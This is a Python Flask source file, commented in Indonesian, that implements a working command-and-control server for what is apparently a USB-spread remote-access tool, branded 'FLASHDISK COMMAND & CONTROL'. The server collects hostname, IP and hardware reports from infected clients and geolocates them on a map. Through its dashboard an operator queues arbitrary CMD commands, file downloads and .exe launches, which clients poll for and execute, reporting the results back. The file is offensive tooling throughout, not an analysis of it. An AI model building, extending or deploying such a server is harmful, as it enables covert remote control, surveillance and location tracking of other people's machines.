import os
import json
import psycopg2
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
from psycopg2.extras import RealDictCursor

app = Flask(__name__)

# --- Database ---
def get_db_connection():
    return psycopg2.connect(os.environ.get('POSTGRES_URL'))

def init_db():
    conn = get_db_connection()
    cur = conn.cursor()
    # Tabel client (laporan hardware) – disimpan per client berdasarkan hostname+ip
    cur.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id SERIAL PRIMARY KEY,
            hostname TEXT UNIQUE,
            ip TEXT,
            hardware_json TEXT,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    ''')
    # Tabel perintah (dari server ke client)
    cur.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id SERIAL PRIMARY KEY,
            client_hostname TEXT,
            command_type TEXT,
            command_data TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP
        );
    ''')
    conn.commit()
    cur.close()
    conn.close()

init_db()

# --- Helper untuk geolokasi (gunakan ipinfo.io) ---
def get_coords_from_ip(ip):
    import requests
    try:
        # Gunakan layanan gratis ipinfo.io (untuk koordinat)
        resp = requests.get(f'https://ipinfo.io/{ip}/json', timeout=5)
        data = resp.json()
        loc = data.get('loc', '0,0')
        lat, lng = loc.split(',')
        return float(lat), float(lng), data.get('city', ''), data.get('region', '')
    except:
        return 0.0, 0.0, 'Unknown', 'Unknown'

# --- HTML Template Matrix + Leaflet + AJAX ---
MATRIX_TEMPLATE = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FLASHDISK MATRIX RECEIVER</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            color: #0f0;
            font-family: 'Courier New', 'Fira Code', monospace;
            padding: 20px;
            position: relative;
            overflow-x: auto;
        }

        /* Efek matrix rain (canvas) */
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
            pointer-events: none;
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(2px);
            border: 1px solid #0f0;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
            border-radius: 12px;
            padding: 20px;
        }

        h1, h2, h3 {
            font-size: 1.6rem;
            text-transform: uppercase;
            letter-spacing: 3px;
            border-left: 4px solid #0f0;
            padding-left: 15px;
            margin-bottom: 20px;
            text-shadow: 0 0 5px #0f0;
        }

        h2 { font-size: 1.3rem; border-left-width: 2px; margin-top: 20px; }
        h3 { font-size: 1rem; border-left: none; margin-top: 10px; }

        .matrix-panel {
            background: #0a0f0a;
            border: 1px solid #0f0;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            box-shadow: 0 0 8px rgba(0,255,0,0.1);
        }

        select, input, button, textarea {
            background: #111;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 8px 12px;
            font-family: monospace;
            font-size: 0.9rem;
            border-radius: 4px;
            outline: none;
        }
        button {
            cursor: pointer;
            transition: all 0.2s;
        }
        button:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 8px #0f0;
        }
        select:focus, input:focus, textarea:focus {
            border-color: #0f0;
            box-shadow: 0 0 5px #0f0;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 10px;
            text-align: left;
        }
        th {
            background: #0f0f0f;
            color: #0f0;
            text-transform: uppercase;
        }
        tr:hover {
            background: #0a1f0a;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 20px;
            font-size: 0.7rem;
            background: #0f0;
            color: #000;
        }
        .status-pending { color: #ffcc00; text-shadow: 0 0 2px #ffcc00; }
        .status-success { color: #0f0; }
        .status-failed { color: #f00; }

        #map {
            height: 300px;
            border: 1px solid #0f0;
            border-radius: 8px;
            background: #000;
        }

        .command-history {
            max-height: 300px;
            overflow-y: auto;
        }

        footer {
            text-align: center;
            margin-top: 20px;
            font-size: 0.7rem;
            color: #0f0a;
        }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div class="container">
    <h1>⚡ FLASHDISK MATRIX RECEIVER ⚡</h1>
    <div class="matrix-panel">
        <label>🔽 PILIH CLIENT : </label>
        <select id="clientSelect" onchange="loadClientData()">
            <option value="">-- Pilih Hostname --</option>
        </select>
    </div>

    <div id="clientInfo" style="display:none;">
        <div class="matrix-panel">
            <h2>🖥️ HARDWARE SPESIFIKASI</h2>
            <div id="hardwareTable"></div>
        </div>

        <div class="matrix-panel">
            <h2>🗺️ LOKASI (IP GEOLOCATION)</h2>
            <div id="map"></div>
            <div id="locDetails"></div>
        </div>

        <div class="matrix-panel">
            <h2>📨 KIRIM PERINTAH KE CLIENT</h2>
            <div>
                <select id="cmdType">
                    <option value="text">📝 Pesan Teks</option>
                    <option value="download">📥 Download File (URL)</option>
                    <option value="run">⚙️ Jalankan Perintah CMD</option>
                    <option value="exec_exe">🎯 Jalankan .exe di Flashdisk</option>
                </select>
                <input type="text" id="cmdData" placeholder="Isi perintah / URL / nama file .exe" style="width: 60%;">
                <button onclick="sendCommand()">📡 KIRIM PERINTAH</button>
            </div>
            <div id="cmdResult" style="margin-top:10px; font-size:0.8rem;"></div>
        </div>

        <div class="matrix-panel">
            <h2>📜 RIWAYAT PERINTAH</h2>
            <div id="commandHistory" class="command-history"></div>
        </div>
    </div>
    <footer>THE MATRIX HAS YOU | 🔌 FLASHDISK COMMAND & CONTROL</footer>
</div>

<script>
    let currentHostname = "";
    let map = null;
    let marker = null;

    // ========== MATRIX RAIN ==========
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#%&@*!?";
    const fontSize = 16;
    let columns = canvas.width / fontSize;
    let drops = [];
    for (let i = 0; i < columns; i++) drops[i] = 1;
    function drawMatrix() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0f0";
        ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        columns = canvas.width / fontSize;
        drops = [];
        for (let i = 0; i < columns; i++) drops[i] = 1;
    });

    // ========== LOAD DAFTAR CLIENT ==========
    async function loadClientList() {
        const res = await fetch('/api/clients');
        const clients = await res.json();
        const select = document.getElementById('clientSelect');
        select.innerHTML = '<option value="">-- Pilih Hostname --</option>';
        clients.forEach(c => {
            const opt = document.createElement('option');
            opt.value = c.hostname;
            opt.textContent = `${c.hostname} (${c.ip}) - last: ${c.last_seen}`;
            select.appendChild(opt);
        });
        if (clients.length > 0 && !currentHostname) {
            select.value = clients[0].hostname;
            loadClientData();
        }
    }

    async function loadClientData() {
        const hostname = document.getElementById('clientSelect').value;
        if (!hostname) return;
        currentHostname = hostname;
        document.getElementById('clientInfo').style.display = 'block';
        // Load hardware
        const hwRes = await fetch(`/api/client/${encodeURIComponent(hostname)}`);
        const client = await hwRes.json();
        if (client.hardware) {
            const hw = client.hardware;
            let html = `<table><tr><th>Properti</th><th>Nilai</th></tr>`;
            for (const [key, val] of Object.entries(hw)) {
                if (typeof val === 'object') {
                    html += `<tr><td>${key}</td><td><pre>${JSON.stringify(val, null, 2)}</pre></td></tr>`;
                } else {
                    html += `<tr><td>${key}</td><td>${val}</td></tr>`;
                }
            }
            html += `</table>`;
            document.getElementById('hardwareTable').innerHTML = html;
        }
        // Load map & location
        const locRes = await fetch(`/api/client/location/${encodeURIComponent(hostname)}`);
        const loc = await locRes.json();
        const lat = loc.lat, lng = loc.lon;
        document.getElementById('locDetails').innerHTML = `<span>📍 ${loc.city}, ${loc.region} | 🧭 ${lat}, ${lng}</span>`;
        if (map === null) {
            map = L.map('map').setView([lat, lng], 12);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a> & CartoDB'
            }).addTo(map);
        } else {
            map.setView([lat, lng], 12);
            if (marker) map.removeLayer(marker);
        }
        marker = L.marker([lat, lng]).addTo(map);
        // Load command history
        loadCommandHistory(hostname);
    }

    async function loadCommandHistory(hostname) {
        const res = await fetch(`/api/commands/${encodeURIComponent(hostname)}`);
        const cmds = await res.json();
        let html = `<table><tr><th>ID</th><th>Tipe</th><th>Data</th><th>Status</th><th>Hasil</th><th>Waktu</th></tr>`;
        cmds.forEach(c => {
            let statusClass = '';
            if (c.status === 'pending') statusClass = 'status-pending';
            else if (c.status === 'success') statusClass = 'status-success';
            else if (c.status === 'failed') statusClass = 'status-failed';
            html += `<tr>
                <td>${c.id}</td>
                <td>${c.command_type}</td>
                <td>${c.command_data}</td>
                <td class="${statusClass}">${c.status}</td>
                <td><pre style="max-width:300px; overflow-x:auto;">${c.result || '-'}</pre></td>
                <td>${c.created_at}</td>
            </tr>`;
        });
        html += `</table>`;
        document.getElementById('commandHistory').innerHTML = html;
    }

    async function sendCommand() {
        const cmdType = document.getElementById('cmdType').value;
        const cmdData = document.getElementById('cmdData').value;
        if (!cmdData) {
            document.getElementById('cmdResult').innerHTML = '<span class="badge">⚠️ Isi data perintah!</span>';
            return;
        }
        const res = await fetch('/api/send_command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                hostname: currentHostname,
                command_type: cmdType,
                command_data: cmdData
            })
        });
        const result = await res.json();
        if (res.ok) {
            document.getElementById('cmdResult').innerHTML = '<span class="badge">✅ Perintah dikirim ke client</span>';
            document.getElementById('cmdData').value = '';
            loadCommandHistory(currentHostname);
        } else {
            document.getElementById('cmdResult').innerHTML = `<span class="badge">❌ Gagal: ${result.message}</span>`;
        }
    }

    // Auto refresh daftar client dan riwayat setiap 10 detik
    setInterval(() => {
        loadClientList();
        if (currentHostname) loadCommandHistory(currentHostname);
    }, 10000);
    loadClientList();
</script>
</body>
</html>
"""

# --- API ENDPOINTS ---
@app.route('/')
def home():
    return render_template_string(MATRIX_TEMPLATE)

@app.route('/api/clients')
def list_clients():
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT hostname, ip, last_seen FROM clients ORDER BY last_seen DESC')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    for row in rows:
        if isinstance(row['last_seen'], datetime):
            row['last_seen'] = row['last_seen'].strftime("%Y-%m-%d %H:%M:%S")
    return jsonify(rows)

@app.route('/api/client/<hostname>')
def get_client(hostname):
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT hardware_json FROM clients WHERE hostname = %s', (hostname,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if row:
        hardware = json.loads(row['hardware_json'])
        return jsonify({'hostname': hostname, 'hardware': hardware})
    return jsonify({'error': 'not found'}), 404

@app.route('/api/client/location/<hostname>')
def client_location(hostname):
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT ip FROM clients WHERE hostname = %s', (hostname,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    if not row:
        return jsonify({'lat': 0, 'lon': 0, 'city': 'Unknown', 'region': 'Unknown'})
    lat, lon, city, region = get_coords_from_ip(row['ip'])
    return jsonify({'lat': lat, 'lon': lon, 'city': city, 'region': region})

@app.route('/api/commands/<hostname>')
def list_commands(hostname):
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT id, command_type, command_data, status, result, created_at FROM commands WHERE client_hostname = %s ORDER BY id DESC', (hostname,))
    rows = cur.fetchall()
    cur.close()
    conn.close()
    for row in rows:
        if isinstance(row['created_at'], datetime):
            row['created_at'] = row['created_at'].strftime("%Y-%m-%d %H:%M:%S")
    return jsonify(rows)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    hostname = data.get('hostname')
    cmd_type = data.get('command_type')
    cmd_data = data.get('command_data')
    if not hostname or not cmd_type or not cmd_data:
        return jsonify({'message': 'Missing fields'}), 400
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        'INSERT INTO commands (client_hostname, command_type, command_data, status) VALUES (%s, %s, %s, %s)',
        (hostname, cmd_type, cmd_data, 'pending')
    )
    conn.commit()
    cur.close()
    conn.close()
    return jsonify({'status': 'ok'}), 200

@app.route('/report', methods=['POST'])
def handle_report():
    """Client mengirim laporan hardware + daftar exe"""
    try:
        data = request.get_json()
        hostname = data.get('hostname')
        ip = data.get('ip')
        hardware = data.get('hardware', {})
        executables = data.get('executables', [])

        # Simpan atau update client
        hardware_json = json.dumps(hardware)
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('''
            INSERT INTO clients (hostname, ip, hardware_json, last_seen) 
            VALUES (%s, %s, %s, NOW())
            ON CONFLICT (hostname) DO UPDATE 
            SET ip = EXCLUDED.ip, hardware_json = EXCLUDED.hardware_json, last_seen = NOW()
        ''', (hostname, ip, hardware_json))
        conn.commit()
        cur.close()
        conn.close()

        print(f"[REPORT] {hostname} ({ip}) - {len(executables)} exe files")
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/poll_commands', methods=['POST'])
def poll_commands():
    """Client meminta perintah yang belum dieksekusi"""
    data = request.json
    hostname = data.get('hostname')
    conn = get_db_connection()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute('SELECT id, command_type, command_data FROM commands WHERE client_hostname = %s AND status = %s ORDER BY id', (hostname, 'pending'))
    pending = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify(pending)

@app.route('/command_result', methods=['POST'])
def command_result():
    """Client melaporkan hasil eksekusi perintah"""
    data = request.json
    cmd_id = data.get('command_id')
    status = data.get('status')  # 'success' or 'failed'
    result = data.get('result', '')
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute('UPDATE commands SET status = %s, result = %s, executed_at = NOW() WHERE id = %s', (status, result, cmd_id))
    conn.commit()
    cur.close()
    conn.close()
    return jsonify({"ok": True})